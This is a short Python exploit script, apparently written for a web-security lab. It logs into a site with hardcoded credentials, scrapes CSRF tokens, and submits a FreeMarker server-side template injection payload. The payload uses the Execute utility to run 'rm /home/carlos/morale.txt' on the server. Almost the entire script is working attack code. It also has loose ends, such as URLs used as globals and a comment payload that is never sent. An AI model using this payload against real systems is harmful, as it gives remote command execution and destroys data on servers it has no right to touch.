import requests
import re
import sys

def get_csrf_token(response_text):
    return re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text).group(1)

def main(base_url):
    session = requests.Session()
    
    response = session.get(base_url)
    csrf_token = get_csrf_token(response.text)
    
    login_data = {
        'csrf': csrf_token,
        'username': 'content-manager',
        'password': 'C0nt3ntM4n4g3r'
    }
    session.post(base_url, data=login_data)

    response = session.get(sec_url)
    csrf_token = get_csrf_token(response.text)

    payload_data = {
        'template': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }',
        'csrf': csrf_token,
        'template-action': 'preview'
    }
    session.post(last_url, data=payload_data)

    csrf_token = get_csrf_token(response.text)
    
    comment_data = {
        'csrf': csrf_token,
        'postId': 8,
        'comment': '1111'
    }

if __name__ == "__main__":
    base_url = sys.argv[1] + '/login'
    sec_url = sys.argv[1] + '/product/template?productId=2'
    last_url = sys.argv[1] + '/product/template?productId=2'

    main(base_url)

